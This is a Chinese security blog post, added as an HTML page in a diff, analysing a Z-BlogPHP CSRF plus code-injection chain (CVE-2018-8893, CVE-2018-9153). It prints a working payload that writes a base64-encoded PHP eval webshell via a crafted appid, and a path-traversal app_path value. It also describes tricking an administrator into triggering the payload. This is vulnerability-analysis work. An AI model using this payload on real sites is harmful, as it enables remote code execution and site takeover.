@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+            <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="description" content="">
+        <meta name="author" content="">
+
+        <title>JenI's Blog</title>
+
+        <link rel="icon" href="https://blog.jenisec.org/theme/images/favicon.ico" type="image/x-icon">  
+        <link rel="shortcut icon" href="https://blog.jenisec.org/theme/images/favicon.ico" type="image/x-icon">  
+
+
+        <link href="https://blog.jenisec.org/theme/css/iconfont.css" rel="stylesheet">
+
+        <!-- Bootstrap Core CSS -->
+        <link href="https://blog.jenisec.org/theme/css/bootstrap.min.css" rel="stylesheet">
+
+        <!-- Custom CSS -->
+        <link href="https://blog.jenisec.org/theme/css/clean-blog.min.css" rel="stylesheet">
+
+        <!-- Code highlight color scheme -->
+            <link href="https://blog.jenisec.org/theme/css/code_blocks/monokai.css" rel="stylesheet">
+
+        <!-- Custom Fonts -->
+        <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+        <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+        <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+        <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+        <!--[if lt IE 9]>
+            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+
+
+
+
+
+			<meta property="og:locale" content="zh">
+		<meta property="og:site_name" content="JenI's Blog">
+
+	<meta property="og:type" content="article">
+	<meta property="article:author" content="">
+	<meta property="og:url" content="https://blog.jenisec.org/security/Z-BlogPHP-CSRF-Getshell.html">
+	<meta property="og:title" content="Z-BlogPHP 结合 CSRF Getshell">
+	<meta property="og:description" content="">
+	<meta property="og:image" content="https://blog.jenisec.org/../theme/images/posts/z-blog/cover.png">
+	<meta property="article:published_time" content="2018-04-25 00:00:00+08:00">
+</head>
+
+<body style="background-color: #f8f8f8">
+
+    <!-- Navigation -->
+    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+        <div class="container-fluid">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header page-scroll">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="https://blog.jenisec.org/">JenI's Blog</a>
+            </div>
+
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+                <ul class="nav navbar-nav navbar-right">
+                        <li><a href="https://blog.jenisec.org/category/ji-qi-xue-xi.html">机器学习</a></li>
+                        <li><a href="https://blog.jenisec.org/category/an-quan.html">安全</a></li>
+                        <li><a href="https://blog.jenisec.org/category/xi-tong.html">系统</a></li>
+                        <li><a href="https://blog.jenisec.org/category/ri-chang.html">日常</a></li>
+
+                </ul>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+
+    <!-- Page Header -->
+        <header class="intro-header" style="background-image: url('../theme/images/posts/z-blog/cover.png')">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <div class="post-heading">
+                        <h1>Z-BlogPHP 结合 CSRF Getshell</h1>
+                        <span class="meta">Posted by
+                                <a href="https://blog.jenisec.org/author/jeni.html">JenI</a>
+                             on 2018-04-25 00:00:00+08:00
+                        </span>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1" style="background-color: #f8f8f8;position: relative;">
+    <!-- Post Content -->
+    <article style="background-color: #f8f8f8;position: relative;">
+        <p><strong><em>前言</em></strong></p>
+<p>Z-BlogPHP是一款强大的博客程序,它支持PHP5.2-7.2，可运行在Windows、Linux、macOS等众多操作系统之上。用户可以将其看作普通博客程序，更可以将其视为一套CMS。它有着强大的可定制性，同时也有着丰富的第三方应用。</p>
+<p>近日，Z-BlogPHP_1_5_1_Zero 及以下版本被指出可被 Getshell，攻击者通过一个 CSRF 漏洞(CVE-2018-8893) 结合 CVE-2018-9153 漏洞可执行任意 PHP 代码。</p>
+<p><strong><em>漏洞分析</em></strong></p>
+<p>漏洞出现在 /zb_users/plugin/AppCentre/plugin_edit.php 文件内，该文件在处理 POST 请求时，首先对传入的 appid 进行了正则判断，由于表达式匹配了 3-30 字符，并要求以数字字母或下划线开头，因此只要前三个字符满足就可以通过检查。</p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/z-blog/zblogphp-csrf-getshell_1.png" alt="zblogphp-csrf-getshell_1" /></div>
+
+<p>接下来的代码内包含了两处 file_put_contents 文件写入操作，他们分别获取了 tpl/main.html 和 tpl/include.php 的文件内容，使用前面获取的 $app-&gt;id 值替换 &lt;%appid%&gt; 之后，再执行文件写入操作。这个过程中由于 $app-&gt;id 可控，所以通过构造恶意的 $app-&gt;id 值，可以执行 PHP 代码，最终导致 Getshell。两个文件写入的位置虽略有不同，但原理都相同，都是将恶意的 PHP 代码包含在传入的 $app-&gt;id 中，通过 CSRF 触发代码执行，所以接下来只对 tpl/main.php 这个模板文件进行分析。</p>
+<p>/tpl/main.php 文件内代码如下：</p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/z-blog/zblogphp-csrf-getshell_2.png" alt="zblogphp-csrf-getshell_2" /></div>
+
+<p>文件中有两处 &lt;%appid%&gt; 被替换为了 $app-&gt;id，这里在构造 $app-&gt;id 值时，可以通过使用 ?&gt; 对 php 代码进行闭合来保证恶意 php 代码的完整性。写入的恶意 php 代码会在管理员访问这个页面时被触发，所以需要控制一下传入的 app_path 参数值，将代码插入到一个管理员可以点击进入的页面，如某个已有插件的某个文件内。</p>
+<p><strong><em>漏洞复现</em></strong></p>
+<p>首先构造 CSRF 需要用到的表单页面，放在攻击者的 Web 服务器上。</p>
+<p>其中 $app-&gt;id 的值构造如下：</p>
+<div class="highlight"><pre><span></span>aaa’)){}$f=fopen(‘cmd.php’,&#39;a’);fwrite($f,base64_decode(‘PD9waHAgQGV2YWwoJF9HRVRbY21kXSk7Pz4=’));fclose($f);?&gt;
+</pre></div>
+
+
+<p>app_path 值构造如下：</p>
+<div class="highlight"><pre><span></span><span class="cp">../Totoro/main.php</span>
+</pre></div>
+
+
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/z-blog/zblogphp-csrf-getshell_3.png" alt="zblogphp-csrf-getshell_3" /></div>
+
+<p>之所以选择 ../Totoro/main.php 这个文件是因为 Totoro 插件内的 main.php 文件在后台管理页面有可以直接访问的位置：</p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/z-blog/zblogphp-csrf-getshell_4.png" alt="zblogphp-csrf-getshell_4" /></div>
+
+<p>诱使网站管理员访问攻击者构造的恶意页面。点击后，会跳转到如下页面：</p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/z-blog/zblogphp-csrf-getshell_5.png" alt="zblogphp-csrf-getshell_5" /></div>
+
+<p>此时恶意的 php 代码已经被插入到了 Totoro/main.php 文件内：</p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/z-blog/zblogphp-csrf-getshell_6.png" alt="zblogphp-csrf-getshell_6" /></div>
+
+<p>这时如果管理员点击了评论管理页面的 Totoro 设置按钮，就会执行攻击者插入到 Totoro/main.php 内的 php 代码，也就是会在 Totoro 目录下写入一句话木马。</p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/z-blog/zblogphp-csrf-getshell_7.png" alt="zblogphp-csrf-getshell_7" /></div>
+
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/z-blog/zblogphp-csrf-getshell_8.png" alt="zblogphp-csrf-getshell_8" /></div>
+
+<p>一句话木马写入成功后，可通过木马执行命令：</p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/z-blog/zblogphp-csrf-getshell_9.png" alt="zblogphp-csrf-getshell_9" /></div>
+
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/z-blog/zblogphp-csrf-getshell_10.png" alt="zblogphp-csrf-getshell_10" /></div>
+
+<p><strong><em>参考</em></strong></p>
+<blockquote>
+<p><a href="http://www.freebuf.com/column/169630.html">http://www.freebuf.com/column/169630.html</a></p>
+</blockquote>
+        <hr />
+        <p>作者:&#160; &#160;JenI&#160; &#160;转载请注明出处，谢谢</p>
+    </article>
+
+    <hr>
+
+        <div class="comments">
+            <h2>Comments !</h2>
+            <div id="disqus_thread"></div>
+            <script type="text/javascript">
+                var disqus_shortname = 'jenihk';
+                var disqus_identifier = 'security/Z-BlogPHP-CSRF-Getshell.html';
+                var disqus_url = 'https://blog.jenisec.org/security/Z-BlogPHP-CSRF-Getshell.html';
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//jenihk.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            </script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+ <!--                   
+    <div id="disqus_thread"></div>
+    <script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = '//jenihk.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+-->
+            </div>
+        </div>
+    </div>
+
+    <hr>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <ul class="list-inline text-center">
+                        <li>
+                            <a href="http://weibo.com/1992014191/profile?rightmod=1&wvr=6&mod=personinfo&is_all=1">
+                                <span class="fa-stack fa-lg">
+                                    <i class="icon iconfont">&#xe657;</i>
+                                </span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="http://github.com/jenihk">
+                                <span class="fa-stack fa-lg">
+                                    <i class="icon iconfont">&#xe618;</i>
+                                </span>
+                            </a>
+                        </li>
+                    </ul>
+                    <p class="copyright text-muted">Blog powered by <a href="http://getpelican.com">Pelican</a>,
+                which takes great advantage of <a href="http://python.org">Python</a>.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- jQuery -->
+    <script src="https://blog.jenisec.org/theme/js/jquery.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="https://blog.jenisec.org/theme/js/bootstrap.min.js"></script>
+
+    <!-- Custom Theme JavaScript -->
+    <script src="https://blog.jenisec.org/theme/js/clean-blog.min.js"></script>
+    
+    <!-- CanvasParticles -->
+    <script src="https://blog.jenisec.org/theme/js/canvas-particle.js"></script>
+
+    
+
+    <script type="text/javascript">
+        CanvasParticle();
+    </script>
+
+    <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-85780345-1']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+    </script>
+<script type="text/javascript">
+    var disqus_shortname = 'jenihk';
+    (function () {
+        var s = document.createElement('script'); s.async = true;
+        s.type = 'text/javascript';
+        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+    }());
+</script>
+</body>
+
+</html>
